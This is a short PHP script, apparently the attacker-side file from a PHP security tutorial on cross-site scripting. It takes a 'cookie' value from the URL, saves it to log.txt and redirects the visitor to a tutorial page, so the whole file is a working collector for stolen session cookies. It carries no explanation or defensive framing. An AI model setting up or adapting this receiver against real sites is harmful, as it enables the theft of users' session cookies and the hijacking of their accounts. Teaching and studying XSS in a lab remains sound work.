<?php

$cookie = $_GET['cookie'];

file_put_contents('log.txt', $cookie);
header('Location: /rankmylist_task/PHP Security Tutorials by CodeCourse/PHP Security XSS (Cross-site Scripting)/index.php');

?>

